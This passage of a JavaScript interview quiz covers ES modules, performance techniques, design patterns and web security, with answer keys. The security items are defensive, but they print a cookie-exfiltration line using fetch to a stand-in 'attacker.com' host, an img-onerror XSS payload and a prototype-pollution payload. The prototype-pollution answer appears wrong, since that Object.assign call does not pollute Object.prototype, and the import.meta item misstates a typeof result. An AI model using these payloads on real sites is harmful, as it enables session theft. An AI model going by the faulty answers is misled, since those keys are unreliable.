**Answer: B) `3.14`, `16`, `"utils-default"`**

**Explanation:** `import * as utils` creates a **namespace object** containing all exports. Named exports are accessible as properties (`utils.PI`, `utils.square`). The default export is accessible as `utils.default`. The namespace object is **live** — if the module updates an exported variable, the namespace object reflects the update.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `export { x as y }` enable?

```javascript
// math.js
const _internalAdd = (a, b) => a + b;
const _internalMultiply = (a, b) => a * b;

export { _internalAdd as add, _internalMultiply as multiply };

// app.js
import { add, multiply } from './math.js';
console.log(add(2, 3));
console.log(multiply(2, 3));
```

- A) `SyntaxError` — internal functions cannot be exported with aliases
- B) `5`, `6`
- C) `TypeError` — `_internalAdd` is undefined when exported
- D) `undefined`, `undefined`

**Answer: B) `5`, `6`**

**Explanation:** `export { name as alias }` re-exports a binding under a different name. This is the **renaming export** syntax — useful for keeping internal implementation names private while providing a cleaner public API. Consumers use `add` and `multiply` without knowing the internal naming convention.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How does `import.meta` provide module context?

```javascript
// In an ES Module
console.log(typeof import.meta.url);   // file URL of current module
console.log(typeof import.meta.env);   // Vite/bundler-injected env vars
```

- A) Both are `undefined`
- B) `"string"`, `"object"` (in Vite/bundler environments)
- C) `"string"`, `undefined` (in plain Node.js without bundler)
- D) Both throw `SyntaxError`

**Answer: C) `"string"`, `undefined` (in plain Node.js without bundler)**

**Explanation:** `import.meta` is a meta-property available in ES Modules. `import.meta.url` is always a string — the URL/path of the current module (set by the runtime). `import.meta.env` is injected by bundlers like Vite/webpack for environment variables — not available in plain Node.js. `import.meta` properties are host-defined, so they vary by environment.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the difference between ES Modules and CommonJS?

- A) CommonJS uses `import/export`; ES Modules use `require/module.exports`
- B) ES Modules are static and synchronous; CommonJS is dynamic and asynchronous
- C) ES Modules use `import/export` (static, async-friendly, tree-shakeable); CommonJS uses `require/module.exports` (dynamic, synchronous, not tree-shakeable)
- D) They are interchangeable with no practical differences

**Answer: C) ES Modules use `import/export` (static, async-friendly, tree-shakeable); CommonJS uses `require/module.exports` (dynamic, synchronous, not tree-shakeable)**

**Explanation:** Key differences: ESM uses `import/export` (static, hoisted, live bindings, async loading, tree-shakeable). CJS uses `require()` (dynamic, synchronous, cached, returns snapshot). ESM\'s static structure enables tree-shaking and better optimization. CJS\'s `require()` can be used conditionally or in loops. Node.js supports both, but they have interop nuances.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does re-exporting from a module enable?

```javascript
// components/index.js (barrel file)
export { Button } from './Button.js';
export { Modal } from './Modal.js';
export { default as Input } from './Input.js';
export * from './utils.js';

// app.js
import { Button, Modal, Input } from './components';
```

- A) `SyntaxError` — barrel files are not allowed in ES Modules
- B) A barrel/index file that aggregates exports, providing a single import point for consumers
- C) All re-exported modules are loaded eagerly regardless of usage
- D) `export *` overrides named exports, causing conflicts

**Answer: B) A barrel/index file that aggregates exports, providing a single import point for consumers**

**Explanation:** Re-exporting (`export { X } from './X.js'`) creates **barrel files** that aggregate multiple module exports. Consumers import from a single path instead of knowing the internal file structure. `export * from` re-exports all named exports. `export { default as Input }` re-exports a default export as a named export. Barrel files improve API ergonomics but can hurt tree-shaking if implemented poorly.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## L4: Expert (Senior / Architect)

<br>

## # 22. Performance Optimization

<br>

## Q. A developer wants to prevent excessive API calls while typing in a search box. Which technique is correct?

```javascript
function debounce(fn, delay) {
  let timer;
  return function(...args) {
    clearTimeout(timer);
    timer = setTimeout(() => fn.apply(this, args), delay);
  };
}

const search = debounce((query) => console.log("Searching:", query), 300);
```

- A) This is throttling — it limits calls to one per interval
- B) This is debouncing — it waits for inactivity before calling the function
- C) This is memoization — it caches the result of the function
- D) This creates a memory leak because `timer` is never cleared

**Answer: B) This is debouncing — it waits for inactivity before calling the function**

**Explanation:** Debouncing delays function execution until after a period of inactivity. Each call resets the timer. Throttling would cap calls to a maximum frequency. Memoization caches results. `clearTimeout` prevents the memory leak.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer memoizes an expensive computation. What is the output and how many times is the heavy computation run?

```javascript
function memoize(fn) {
  const cache = new Map();
  return function(n) {
    if (cache.has(n)) return cache.get(n);
    const result = fn(n);
    cache.set(n, result);
    return result;
  };
}

let calls = 0;
const heavy = memoize((n) => { calls++; return n * n; });

console.log(heavy(4));
console.log(heavy(4));
console.log(heavy(5));
console.log("calls:", calls);
```

- A) `16`, `16`, `25`, `"calls: 3"`
- B) `16`, `16`, `25`, `"calls: 2"`
- C) `16`, `undefined`, `25`, `"calls: 2"`
- D) `16`, `16`, `25`, `"calls: 1"`

**Answer: B) `16`, `16`, `25`, `"calls: 2"`**

**Explanation:** First call `heavy(4)` — cache miss, computes `16`, stores it. Second call `heavy(4)` — cache hit, returns `16` without calling the function. `heavy(5)` — cache miss, computes `25`. Only 2 actual computations occur.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the difference between debounce and throttle?

- A) Debounce delays execution until after a pause; throttle limits execution to once per interval
- B) Throttle delays execution until after a pause; debounce limits execution to once per interval
- C) Both are identical — just different naming conventions
- D) Debounce is for mouse events; throttle is for keyboard events

**Answer: A) Debounce delays execution until after a pause; throttle limits execution to once per interval**

**Explanation:** **Debounce**: delays function until after `delay` ms of silence (no new calls). Use for search input (wait until user stops typing). **Throttle**: ensures function runs at most once per `interval` ms regardless of call frequency. Use for scroll/resize handlers. Rule of thumb: debounce = "wait for quiet time"; throttle = "rate-limit".

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `requestAnimationFrame` do for smooth animations?

```javascript
// Janky: changes DOM in setTimeout
setTimeout(() => { element.style.left = newPosition + 'px'; }, 16);

// Smooth: changes DOM via rAF
requestAnimationFrame(() => { element.style.left = newPosition + 'px'; });
```

- A) Both produce identical results — `setTimeout(fn, 16)` equals `rAF`
- B) `requestAnimationFrame` syncs DOM updates with the browser\'s repaint cycle (~60fps), preventing jank
- C) `requestAnimationFrame` is slower — it adds an extra 16ms delay
- D) `requestAnimationFrame` only works in IE11+

**Answer: B) `requestAnimationFrame` syncs DOM updates with the browser\'s repaint cycle (~60fps), preventing jank**

**Explanation:** `requestAnimationFrame` schedules the callback just before the browser\'s next repaint. Unlike `setTimeout(fn, 16)` (which drifts and can miss frames), `rAF` is synchronized with the display refresh rate. The browser can also batch/optimize `rAF` callbacks and pause them in background tabs to save power.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does DocumentFragment do for DOM performance?

```javascript
// Slow: multiple reflows
const list = document.getElementById('list');
for (let i = 0; i < 1000; i++) {
  const li = document.createElement('li');
  li.textContent = `Item ${i}`;
  list.appendChild(li); // triggers reflow each time
}

// Fast: batch append
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  const li = document.createElement('li');
  li.textContent = `Item ${i}`;
  fragment.appendChild(li);
}
list.appendChild(fragment); // single reflow
```

- A) Both approaches cause the same number of reflows
- B) `DocumentFragment` batches all nodes and triggers a single reflow/repaint on insertion
- C) `DocumentFragment` is deprecated — use `innerHTML` instead
- D) `appendChild` is always batched automatically by the browser

**Answer: B) `DocumentFragment` batches all nodes and triggers a single reflow/repaint on insertion**

**Explanation:** Each `appendChild` to a live DOM element can trigger reflow/repaint. `DocumentFragment` is an off-screen container — nodes added to it don\'t trigger reflows. When the fragment is appended to the DOM, all its children are inserted in one operation — a single reflow/repaint. For 1000 items, this is a significant performance gain.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the key performance benefit of virtual DOM?

- A) Virtual DOM is faster than real DOM for every operation
- B) Virtual DOM minimizes expensive real DOM operations by computing the minimal diff (reconciliation) needed and applying only those changes in batch
- C) Virtual DOM stores data in memory, avoiding network requests
- D) Virtual DOM is only useful for server-side rendering

**Answer: B) Virtual DOM minimizes expensive real DOM operations by computing the minimal diff (reconciliation) needed and applying only those changes in batch**

**Explanation:** Direct DOM manipulation is expensive (triggers reflow/repaint). Virtual DOM frameworks (React, Vue) maintain an in-memory representation of the DOM. When state changes, a new virtual DOM is computed and **diffed** against the previous one. Only the minimal set of actual DOM changes is applied. For frequent updates, this batching approach can significantly reduce layout thrashing.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does code splitting enable in large applications?

- A) Splitting code into multiple files that are all loaded upfront
- B) Dividing the bundle into smaller chunks that are loaded on demand, reducing initial load time
- C) Splitting CSS from JavaScript for parallel loading
- D) Minifying JavaScript to reduce file size

**Answer: B) Dividing the bundle into smaller chunks that are loaded on demand, reducing initial load time**

**Explanation:** Code splitting (via `import()`, webpack, Rollup) divides the app into chunks. Only the initial chunk loads at startup; other chunks load when needed (route change, user interaction). This reduces Time to First Byte (TTFB) and Time to Interactive (TTI). Combined with lazy loading and route-based splitting, it dramatically improves perceived performance for large SPAs.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the performance impact of memory leaks in JavaScript?

```javascript
// Memory leak example
function createLeak() {
  const cache = [];
  return function() {
    cache.push(new Array(1000000).fill('data')); // grows indefinitely
    return cache.length;
  };
}
const leaky = createLeak();
setInterval(leaky, 100); // keeps adding to cache forever
```

- A) No impact — JavaScript\'s garbage collector handles all memory management
- B) Memory usage grows indefinitely, eventually causing slowdowns, tab crashes, or OOM errors
- C) The garbage collector detects and fixes the leak automatically
- D) Memory leaks only affect mobile browsers

**Answer: B) Memory usage grows indefinitely, eventually causing slowdowns, tab crashes, or OOM errors**

**Explanation:** A memory leak occurs when objects that are no longer needed are still referenced (preventing garbage collection). Here, `cache` grows every 100ms with 1MB arrays. GC cannot collect them because `leaky` holds a closure reference. Over time: slowdowns → UI freezes → browser tab crash (OOM). Use Chrome DevTools Memory profiler to detect heap growth and leaked object retention.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is layout thrashing and how do you avoid it?

```javascript
// Thrashing: read then write then read then write
elements.forEach(el => {
  const height = el.offsetHeight; // read → forces layout
  el.style.height = height * 2 + 'px'; // write → invalidates layout
});

// Optimized: batch reads then batch writes
const heights = elements.map(el => el.offsetHeight); // all reads
elements.forEach((el, i) => { el.style.height = heights[i] * 2 + 'px'; }); // all writes
```

- A) Both approaches cause the same number of layout calculations
- B) Interleaving reads/writes forces the browser to synchronously recalculate layout repeatedly; batching reads then writes allows a single calculation
- C) `offsetHeight` is cached by the browser, so reads are free
- D) CSS transitions eliminate layout thrashing automatically

**Answer: B) Interleaving reads/writes forces the browser to synchronously recalculate layout repeatedly; batching reads then writes allows a single calculation**

**Explanation:** Layout properties (`offsetHeight`, `clientWidth`, `getBoundingClientRect`, etc.) trigger a **synchronous layout calculation** to return an accurate value. If you write to the DOM first (invalidating layout) and then read, the browser is forced to recalculate layout synchronously. Batching all reads first (letting the browser defer layout) then writing avoids this expensive forced synchronous layout.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `WeakRef` help with in performance-sensitive code?

```javascript
let obj = { data: new Array(1000000).fill(0) };
const weakRef = new WeakRef(obj);

obj = null; // remove strong reference
// GC may now collect the object

setTimeout(() => {
  const deref = weakRef.deref();
  console.log(deref ? 'still alive' : 'collected');
}, 1000);
```

- A) `WeakRef` prevents garbage collection — `"still alive"` always
- B) `WeakRef` holds a weak reference — the object can be collected; `deref()` returns `undefined` after collection
- C) `WeakRef` is not supported in modern browsers
- D) Setting `obj = null` creates a strong reference via `WeakRef`

**Answer: B) `WeakRef` holds a weak reference — the object can be collected; `deref()` returns `undefined` after collection**

**Explanation:** `WeakRef` allows you to hold a reference to an object without preventing its garbage collection. `deref()` returns the object if it still exists, or `undefined` if collected. Useful for caches where you want to allow eviction under memory pressure. The GC timing is non-deterministic — the output could be either depending on GC activity.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does worker thread offloading solve?

```javascript
// Main thread — blocked
function heavySync() {
  let sum = 0;
  for (let i = 0; i < 1e9; i++) sum += i;
  return sum;
}

// Worker thread — non-blocking
const worker = new Worker('./heavy-worker.js');
worker.postMessage({ iterations: 1e9 });
worker.onmessage = (e) => console.log('Result:', e.data.result);
console.log('UI still responsive'); // logs immediately
```

- A) Both approaches block the UI equally
- B) Worker threads run in a separate thread — heavy computation doesn\'t block the main thread\'s UI rendering
- C) Web Workers share memory with the main thread automatically
- D) Worker threads are only available in Node.js

**Answer: B) Worker threads run in a separate thread — heavy computation doesn\'t block the main thread\'s UI rendering**

**Explanation:** JavaScript is single-threaded. `heavySync()` blocks the event loop — the UI freezes for the entire duration. Web Workers run in a separate OS thread with their own event loop. Communication is via `postMessage` (structured clone or transferable objects). The main thread remains responsive. Use Workers for image processing, encryption, data transformation, or any CPU-intensive work.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 23. Design Patterns

<br>

## Q. A developer implements a Singleton. Is the following a correct Singleton pattern?

```javascript
const Database = (() => {
  let instance;
  function createInstance() {
    return { connection: "db://localhost" };
  }
  return {
    getInstance() {
      if (!instance) instance = createInstance();
      return instance;
    }
  };
})();

const db1 = Database.getInstance();
const db2 = Database.getInstance();
console.log(db1 === db2);
```

- A) `false` — each `getInstance()` call creates a new object
- B) `true` — this correctly implements the Singleton pattern
- C) `TypeError` — `instance` is not accessible outside `createInstance`
- D) `false` — IIFE prevents Singleton behavior

**Answer: B) `true` — this correctly implements the Singleton pattern**

**Explanation:** The IIFE creates a private `instance` variable. `getInstance()` creates the instance only once (lazy initialization) and returns the same object on subsequent calls. `db1 === db2` is `true` because they reference the same object.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer uses the Observer/Pub-Sub pattern. What is logged when this runs?

```javascript
class EventEmitter {
  constructor() { this.events = {}; }
  on(event, listener) {
    (this.events[event] = this.events[event] || []).push(listener);
  }
  emit(event, data) {
    (this.events[event] || []).forEach(fn => fn(data));
  }
}

const emitter = new EventEmitter();
emitter.on("data", x => console.log("listener1:", x));
emitter.on("data", x => console.log("listener2:", x * 2));
emitter.emit("data", 5);
```

- A) `"listener1: 5"` only
- B) `"listener2: 10"` only
- C) `"listener1: 5"`, `"listener2: 10"`
- D) `TypeError: events[event] is not iterable`

**Answer: C) `"listener1: 5"`, `"listener2: 10"`**

**Explanation:** Both listeners are registered for `"data"`. When `emit("data", 5)` is called, all registered listeners execute with `data = 5`. This is the Publish-Subscribe pattern used extensively in Node.js\'s `EventEmitter`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer implements a Factory pattern. What does this return?

```javascript
function createShape(type, size) {
  const shapes = {
    circle: { type: "circle", area: () => Math.PI * size ** 2 },
    square: { type: "square", area: () => size ** 2 }
  };
  return shapes[type] || null;
}

const shape = createShape("square", 4);
console.log(shape.type);
console.log(shape.area());
```

- A) `"square"`, `8`
- B) `"square"`, `16`
- C) `null`, `TypeError`
- D) `"square"`, `Math.PI * 16`

**Answer: B) `"square"`, `16`**

**Explanation:** The Factory returns an object based on `type`. For `"square"` with `size = 4`, `area()` computes `4 ** 2 = 16`. The factory pattern decouples object creation from usage, making it easy to add new shapes.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What problem does the Decorator pattern solve?

```javascript
function withLogging(fn) {
  return function(...args) {
    console.log(`Calling with: ${args}`);
    const result = fn.apply(this, args);
    console.log(`Result: ${result}`);
    return result;
  };
}

function add(a, b) { return a + b; }
const loggedAdd = withLogging(add);
loggedAdd(2, 3);
```

- A) It prevents the original `add` function from being called
- B) It adds logging behavior to `add` without modifying its source — separating cross-cutting concerns
- C) It creates a new function that replaces `add` permanently
- D) It\'s equivalent to subclassing

**Answer: B) It adds logging behavior to `add` without modifying its source — separating cross-cutting concerns**

**Explanation:** The Decorator pattern wraps a function/object to add behavior without modifying the original. `withLogging` is a higher-order function (decorator) that adds logging as a cross-cutting concern. The original `add` is unchanged and reusable. This pattern is the basis for TypeScript decorators, middleware, and aspect-oriented programming.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How does the Strategy pattern improve code flexibility?

```javascript
const sorters = {
  bubble: arr => [...arr].sort((a,b) => a - b), // simplified
  quick: arr => [...arr].sort((a,b) => a - b),   // simplified
  merge: arr => [...arr].sort((a,b) => a - b)    // simplified
};

class Sorter {
  constructor(strategy = 'bubble') {
    this.strategy = sorters[strategy];
  }
  sort(data) { return this.strategy(data); }
}

const s = new Sorter('quick');
console.log(s.sort([3,1,2]));
```

- A) `[3,1,2]` — strategy does nothing
- B) `[1,2,3]`
- C) `TypeError` — functions cannot be stored in objects
- D) Throws `RangeError`

**Answer: B) `[1,2,3]`**

**Explanation:** The Strategy pattern encapsulates interchangeable algorithms. The `Sorter` class delegates to a strategy function selected at runtime. Switching algorithms requires only changing the strategy, not the `Sorter` class. In real implementations, each strategy would have different algorithm implementations. Useful for payment processors, compression algorithms, validation rules, etc.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the Command pattern enable beyond simple function calls?

- A) Commands are identical to function calls — no difference
- B) The Command pattern encapsulates operations as objects, enabling queuing, undo/redo, logging, and remote execution
- C) Commands prevent functions from throwing errors
- D) Commands are only useful for UI event handling

**Answer: B) The Command pattern encapsulates operations as objects, enabling queuing, undo/redo, logging, and remote execution**

**Explanation:** The Command pattern turns operations into first-class objects with `execute()` and optionally `undo()`. This enables: **undo/redo** (keep a history of commands); **queuing** (store commands for later execution); **logging** (serialize command history for debugging/audit); **remote execution** (send serialized commands across a network). Used in text editors, game engines, and transactional systems.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How does the Proxy pattern add behavior without modifying the target?

```javascript
function createReadOnly(target) {
  return new Proxy(target, {
    set(target, prop, value) {
      throw new TypeError(`Cannot set property "${prop}" — object is read-only`);
    }
  });
}

const config = createReadOnly({ api: 'https://api.example.com' });
console.log(config.api);
try { config.api = 'https://evil.com'; } catch(e) { console.log(e.message.includes('read-only')); }
```

- A) `"https://api.example.com"`, `false`
- B) `"https://api.example.com"`, `true`
- C) `TypeError` immediately — read-only prevents all access
- D) `"https://evil.com"`, `true` — read-only doesn\'t work at runtime

**Answer: B) `"https://api.example.com"`, `true`**

**Explanation:** `Proxy` wraps the target and intercepts operations. The `set` trap fires when attempting to write a property — here it throws. The `get` trap is not defined, so reads pass through to the target normally. This implements read-only objects without modifying the original. `e.message.includes('read-only')` → `true`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the Mediator pattern\'s role in decoupling components?

- A) The Mediator directly connects all components for direct communication
- B) The Mediator centralizes inter-component communication — components don\'t talk to each other directly, reducing coupling
- C) The Mediator is identical to the Observer/Pub-Sub pattern
- D) The Mediator pattern is only useful for backend systems

**Answer: B) The Mediator centralizes inter-component communication — components don\'t talk to each other directly, reducing coupling**

**Explanation:** The Mediator acts as a hub. Components (colleagues) communicate through the mediator, not directly with each other. This reduces dependencies from O(n²) (all-to-all) to O(n) (all-to-mediator). Examples: air traffic control (planes ↔ tower ↔ planes), chat rooms (users ↔ server ↔ users), React\'s lifting state up, Redux store. Contrast with Observer: Mediator has logic; Pub-Sub is passive.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the Chain of Responsibility pattern accomplish?

```javascript
class Handler {
  setNext(handler) { this.next = handler; return handler; }
  handle(request) { return this.next ? this.next.handle(request) : null; }
}
class AuthHandler extends Handler {
  handle(req) { return req.token ? super.handle(req) : 'Unauthorized'; }
}
class RateLimitHandler extends Handler {
  handle(req) { return req.rateOk ? super.handle(req) : 'Rate limited'; }
}
class ProcessHandler extends Handler {
  handle(req) { return `Processed: ${req.data}`; }
}

const auth = new AuthHandler();
auth.setNext(new RateLimitHandler()).setNext(new ProcessHandler());
console.log(auth.handle({ token: true, rateOk: true, data: 'payload' }));
console.log(auth.handle({ token: false, rateOk: true, data: 'payload' }));
```

- A) `"Processed: payload"`, `"Processed: payload"`
- B) `"Processed: payload"`, `"Unauthorized"`
- C) `"Rate limited"`, `"Unauthorized"`
- D) Both `null`

**Answer: B) `"Processed: payload"`, `"Unauthorized"`**

**Explanation:** Chain of Responsibility passes a request along a chain of handlers. Each handler decides to process or pass forward. Request 1: `token=true` → passes auth → `rateOk=true` → passes rate limit → processed. Request 2: `token=false` → auth handler rejects → `"Unauthorized"`. Used in middleware pipelines (Express, Koa), validation chains, event handling.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the Module Revealing pattern expose and hide?

```javascript
const counter = (() => {
  let _count = 0;
  
  function increment() { _count++; }
  function decrement() { _count--; }
  function getCount() { return _count; }
  
  return { increment, decrement, getCount };
})();

counter.increment();
counter.increment();
counter.decrement();
console.log(counter.getCount());
console.log(counter._count);
```

- A) `1`, `1`
- B) `1`, `undefined`
- C) `2`, `undefined`
- D) `2`, `1`

**Answer: B) `1`, `undefined`**

**Explanation:** The Revealing Module Pattern uses an IIFE to create a private scope. `_count` is private — not exposed in the returned object. Only `increment`, `decrement`, `getCount` are public. `increment()` twice (→ 2), `decrement()` once (→ 1). `counter.getCount()` returns `1`. `counter._count` is `undefined` — the private variable is inaccessible from outside.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the Template Method pattern enforce?

```javascript
class DataProcessor {
  process(data) { // template method
    const parsed = this.parse(data);
    const validated = this.validate(parsed);
    return this.format(validated);
  }
  parse(data) { throw new Error('parse() must be implemented'); }
  validate(data) { return data; } // default: pass-through
  format(data) { return data; }   // default: pass-through
}

class CSVProcessor extends DataProcessor {
  parse(data) { return data.split(','); }
  format(data) { return data.map(s => s.trim()); }
}

console.log(new CSVProcessor().process(' a , b , c '));
```

- A) `TypeError` — abstract methods cannot have defaults
- B) `[" a ", " b ", " c "]`
- C) `["a", "b", "c"]`
- D) `"a,b,c"`

**Answer: C) `["a", "b", "c"]`**

**Explanation:** Template Method defines the skeleton of an algorithm in the base class, letting subclasses override specific steps without changing the overall structure. `process()` is the template — it calls `parse` → `validate` → `format`. `CSVProcessor` overrides `parse` (split by comma) and `format` (trim). `validate` uses the default pass-through. Result: `["a","b","c"]`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 24. Security

<br>

## Q. A developer dynamically inserts user input into the DOM. Which code is vulnerable to XSS and what is the fix?

```javascript
// Vulnerable
function renderMessage(userInput) {
  document.getElementById("output").innerHTML = userInput;
}

// Fix — which is correct?
```

- A) Use `innerText` or `textContent` instead of `innerHTML`
- B) Wrap the input in `<script>` tags to sanitize it
- C) Encode the input using `encodeURIComponent`
- D) Use `JSON.stringify` on the input

**Answer: A) Use `innerText` or `textContent` instead of `innerHTML`**

**Explanation:** `innerHTML` parses the string as HTML, allowing injected `<script>` tags or event handlers (`<img onerror="...">`) to execute. `textContent`/`innerText` inserts the content as plain text, preventing HTML parsing and XSS attacks.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer stores a JWT token for authentication. Which storage method is most secure and why?

- A) `localStorage` — easy to access and persists across sessions
- B) `sessionStorage` — cleared when the tab closes, harder to steal
- C) An `HttpOnly` cookie — inaccessible to JavaScript, preventing XSS theft
- D) A global JavaScript variable — stays in memory, not persisted to disk

**Answer: C) An `HttpOnly` cookie — inaccessible to JavaScript, preventing XSS theft**

**Explanation:** `HttpOnly` cookies cannot be accessed via `document.cookie` or any JavaScript, making them immune to XSS token theft. `localStorage` and `sessionStorage` are readable by any script on the page. Pair `HttpOnly` with `SameSite=Strict` and `Secure` flags for CSRF protection.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer evaluates user-submitted code. What is the security risk?

```javascript
function calculate(expression) {
  return eval(expression);
}
console.log(calculate("2 + 2")); // 4
console.log(calculate("fetch('https://attacker.com?c=' + document.cookie)"));
```

- A) No risk — `eval` runs in a sandbox
- B) `eval` executes arbitrary code, enabling data exfiltration, XSS, and code injection
- C) The second call throws a `SyntaxError`
- D) `eval` is blocked by Content Security Policy automatically

**Answer: B) `eval` executes arbitrary code, enabling data exfiltration, XSS, and code injection**

**Explanation:** `eval` executes any JavaScript string with the same privileges as the page. An attacker can inject code to steal cookies, redirect users, or manipulate the DOM. Use `JSON.parse` for data or a math expression parser library instead of `eval`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is Cross-Site Request Forgery (CSRF) and how is it mitigated in JavaScript apps?

- A) CSRF is an attack that injects scripts into a page; mitigated by escaping HTML output
- B) CSRF tricks authenticated users into making unintended requests; mitigated by CSRF tokens, `SameSite` cookies, and checking `Origin`/`Referer` headers
- C) CSRF is a network-level attack; JavaScript cannot mitigate it
- D) CSRF only affects GET requests; POST requests are safe by default

**Answer: B) CSRF tricks authenticated users into making unintended requests; mitigated by CSRF tokens, `SameSite` cookies, and checking `Origin`/`Referer` headers**

**Explanation:** CSRF exploits that browsers automatically send cookies with cross-origin requests. An attacker\'s page can trigger a request to your API with the victim\'s session cookie. Mitigations: **CSRF tokens** (unique per-session/per-form, validated server-side); **`SameSite=Strict/Lax` cookies** (prevent cross-site cookie sending); **`Origin`/`Referer` header validation**. Modern SPAs using Authorization headers (Bearer tokens) in AJAX requests are naturally CSRF-resistant.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does Content Security Policy (CSP) prevent?

- A) CSP prevents SQL injection attacks
- B) CSP prevents unauthorized script execution by defining trusted sources for content, mitigating XSS attacks
- C) CSP prevents all network requests from the page
- D) CSP only affects images and stylesheets, not scripts

**Answer: B) CSP prevents unauthorized script execution by defining trusted sources for content, mitigating XSS attacks**

**Explanation:** CSP is an HTTP response header (`Content-Security-Policy`) that tells browsers which content sources are trusted. `script-src 'self' https://cdn.trusted.com` allows scripts only from the same origin and the CDN. Inline scripts (`<script>` tags, `eval`, `onclick`) are blocked unless explicitly allowed. This limits the impact of XSS — even if an attacker injects a script tag, it can\'t execute if the source isn\'t whitelisted.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is prototype pollution and why is it dangerous?

```javascript
const payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
Object.assign({}, payload); // merges __proto__

console.log({}.isAdmin); // prototype polluted!
```

- A) `undefined` — JSON.parse sanitizes `__proto__`
- B) `true` — the prototype is polluted, affecting all plain objects
- C) `TypeError` — `__proto__` cannot be assigned
- D) `false`

**Answer: B) `true` — the prototype is polluted, affecting all plain objects**

**Explanation:** Prototype pollution occurs when attacker-controlled data modifies `Object.prototype`. After `Object.assign({}, payload)`, `Object.prototype.isAdmin = true`. Every plain object inherits from `Object.prototype` → `{}.isAdmin` is `true`. This can bypass security checks like `if (user.isAdmin)`. Mitigate with: `JSON.parse` with a reviver filtering `__proto__`; using `Object.create(null)` for merge targets; input validation; or using `structuredClone`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What makes `innerHTML` dangerous and what is the safe alternative?

```javascript
// Dangerous
const userInput = '<img src=x onerror=alert(document.cookie)>';
document.body.innerHTML = userInput; // XSS!

// Safe
document.body.textContent = userInput; // Escapes HTML
// or
const el = document.createElement('p');
el.textContent = userInput; // Also safe
```

- A) `innerHTML` is safe — browsers sanitize HTML automatically
- B) `innerHTML` parses HTML and executes embedded scripts/event handlers, enabling XSS; `textContent` sets plain text without parsing
- C) `textContent` is deprecated — use `innerHTML` with manual escaping
- D) Both are equivalent for security

**Answer: B) `innerHTML` parses HTML and executes embedded scripts/event handlers, enabling XSS; `textContent` sets plain text without parsing**

**Explanation:** `innerHTML` causes the browser to parse and render HTML, including executing `onerror`, `onload`, `<script>` etc. `textContent` sets raw text — special characters become literal text, not HTML. Always use `textContent` for displaying user-provided data. If you need to render trusted HTML, use the `DOMParser` API with sanitization, or a trusted library like DOMPurify.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the Same-Origin Policy and when does CORS override it?

- A) Same-Origin Policy allows all cross-origin requests by default; CORS restricts them
- B) Same-Origin Policy blocks cross-origin read access from JavaScript; CORS is a server-controlled mechanism to selectively allow cross-origin requests
- C) Same-Origin Policy applies only to cookies; CORS only applies to images
- D) CORS completely overrides Same-Origin Policy for all request types

**Answer: B) Same-Origin Policy blocks cross-origin read access from JavaScript; CORS is a server-controlled mechanism to selectively allow cross-origin requests**

**Explanation:** The Same-Origin Policy (SOP) restricts JavaScript from reading responses from different origins (different protocol, domain, or port). CORS (`Access-Control-Allow-Origin: *` or specific origin) is a server response header that tells browsers it\'s safe to expose the response to the requesting origin. SOP is enforced by browsers; CORS is a browser-respected server permission mechanism. Servers must opt-in to cross-origin access.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What security risk does `postMessage` without origin validation create?

```javascript
// Risky
window.addEventListener('message', (event) => {
  document.body.innerHTML = event.data; // dangerous!
});

// Safe
window.addEventListener('message', (event) => {
  if (event.origin !== 'https://trusted.com') return;
  document.body.textContent = event.data; // safe origin + safe rendering
});
```

- A) No risk — `postMessage` only works between trusted windows
- B) Any page can send a message and inject HTML if origin is not validated; also using `innerHTML` with the data creates XSS
- C) `postMessage` requires user interaction — it can\'t be automated
- D) The browser blocks `postMessage` from different origins automatically

